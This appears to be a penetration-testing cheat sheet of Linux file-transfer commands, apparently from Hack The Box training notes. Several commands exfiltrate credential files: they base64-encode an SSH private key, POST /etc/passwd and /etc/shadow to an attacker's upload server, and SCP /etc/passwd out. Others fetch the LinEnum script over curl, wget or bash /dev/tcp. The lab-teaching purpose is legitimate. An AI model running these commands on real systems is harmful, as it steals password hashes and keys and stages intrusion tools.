# Download Operations

## Base64 Encode/Decode

```sh title="Check file md5 hash"
md5sum id_rsa
```

```sh title="Encode file to Base64"
cat id_rsa | base64 -w 0;echo
```

## Web Downloads with Wget and cURL

### Download using Wget

Uppercase `-O` flag

```sh
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh
```

### Download using cURL

Lowercase `-o` flag

```sh
curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
```

## Download with Bash (/dev/tcp)

When no well-known file transfer tools are available, we can use **Bash** as long as the version is `2.04` or above. We can use the built-in `/dev/tcp`

### Connect to Target Webserver

```sh
exec 3<>/dev/tcp/IP_HERE/PORT
```

### HTTP GET Request

```sh
echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3
```

### Print the Response

```sh
cat <&3
```

## SSH Downloads

### Downloading Files using SCP

```sh
scp plaintext@192.X.X.X:/root/myroot.txt .
```

---

# Upload Operations

## Web Uploads

We can configure Python `uploadserver` package to use **HTTPS**

### Create Self-Signed Certificate

```sh
openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
```

### Starting the Webserver

```sh
sudo python3 -m uploadserver 443 --server-certificate ~/server.pem
```

### Upload Multiple Files

```sh
curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
```

## Alternative Web File Transfer Method

```python title="Creating Web Server with Python3"
python3 -m http.server
```

```python title="Creating Web Server with Python2.7"
python2.7 -m SimpleHTTPServer
```

```php title="Creating Web Server with PHP"
php -s 0.0.0.0:8080
```

```ruby title="Creating Web Server with Ruby"
ruby -run -ehttpd . -p8000
```

## SCP Upload

```sh
scp /etc/passwd htb-student@10.129.86.90:/home/htb-student/
```


